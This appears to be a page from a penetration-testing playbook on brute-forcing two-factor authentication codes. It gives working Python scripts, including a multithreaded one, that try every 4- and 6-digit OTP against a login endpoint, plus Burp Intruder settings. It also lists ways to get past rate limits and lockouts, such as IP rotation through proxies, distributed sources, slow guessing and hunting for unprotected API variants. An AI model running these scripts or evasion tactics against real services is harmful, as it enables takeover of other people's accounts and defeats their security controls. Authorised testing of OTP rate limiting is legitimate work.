# 2FA — OTP Brute Force

## When this applies

- The verification endpoint accepts OTP guesses without rate limiting.
- The OTP space is small enough to enumerate (4–6 digits = 10⁴ to 10⁶ values).
- The OTP doesn't change during the attack window (long-lived static codes).

## Technique

Iterate through the entire OTP space. Without rate limiting, a 4-digit OTP (10,000 values) is exhaustively testable in seconds; a 6-digit OTP (1,000,000 values) takes minutes-to-hours depending on rate.

## Steps

### 1. Identify OTP length and charset

Fingerprint by the UI hint or successful verification:
- 4-digit numeric: 10⁴ = 10,000 values
- 6-digit numeric: 10⁶ = 1,000,000 values
- Alphanumeric (rarer): much larger space — usually impractical

### 2. Set up a session that's pending OTP

```python
session = requests.Session()
session.post('https://target.com/login', data={'username':'test','password':'test123'})
# Now session is pending OTP
```

### 3. Brute-force loop (4-digit)

```python
import requests

for code in range(10000):
    otp = str(code).zfill(4)
    r = session.post('https://target.com/verify-2fa', json={
        'username':'test',
        'otp': otp
    })
    if r.status_code == 200 and 'success' in r.text:
        print(f"[+] OTP found: {otp}")
        break
```

### 4. Brute-force loop (6-digit) with multi-threading

```python
import requests, concurrent.futures

def try_code(code):
    otp = str(code).zfill(6)
    r = session.post('https://target.com/verify-2fa',
                     json={'username':'test','otp':otp})
    if r.status_code == 200 and 'success' in r.text:
        return otp
    return None

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
    futures = {ex.submit(try_code, i): i for i in range(1000000)}
    for f in concurrent.futures.as_completed(futures):
        if f.result():
            print(f"[+] OTP: {f.result()}")
            ex.shutdown(wait=False)
            break
```

### 5. Burp Intruder

- Sniper attack on `otp` parameter.
- Payloads: Numbers from 0 to 9999 (or 999999), padded to fixed length.
- Resource pool: max requests = however much the server tolerates.
- Grep Match: success indicator (`Welcome` / `dashboard`).

### 6. Account lockout / rate limiting checks

Before the full attack, send 10–20 incorrect guesses and watch for:
- 429 responses (rate limited).
- Account locked errors.
- Captcha challenges introduced.
- IP-based throttling (try IP rotation).

If rate-limited, fall back to:
- IP rotation via proxies (if scope allows).
- Distributed sources.
- Slow brute force (1 attempt/minute over hours).
- Look for endpoint variations (mobile API, GraphQL) without rate limiting.

### 7. Race condition variant

Submit many parallel requests with sequential OTPs — same as `race-condition.md` scenario but applied to OTP.

### 8. Common starting points

The OTP code most likely to succeed first is one that the user is currently looking at. Many implementations use TOTP with 30-second windows, so the "right" code rotates. Test:
- Recently sent SMS codes (often static for 5 minutes).
- Email-delivered codes (static for 10–60 minutes).
- TOTP codes (usable for 30 seconds, but often have 1-window grace period).

## Verifying success

- Successful response (200 with session cookie) on a specific OTP.
- Subsequent requests to protected resources succeed.
- The OTP found matches the user's actual current code (correlate with email/SMS if accessible).

## Common pitfalls

- Modern apps rate-limit OTP attempts (typically 3–5 per minute per account).
- Account lockout after N failures (often 5–10).
- IP-based throttling via WAF.
- OTP rotation during attack — TOTP changes every 30s; you may pass the right code but it expires.
- CAPTCHA injection after a few failures.

## Tools

- Burp Intruder.
- Custom Python with `concurrent.futures`.
- ffuf / hydra (general-purpose; configure for the verification endpoint).
- Turbo Intruder for high-throughput single-request testing.
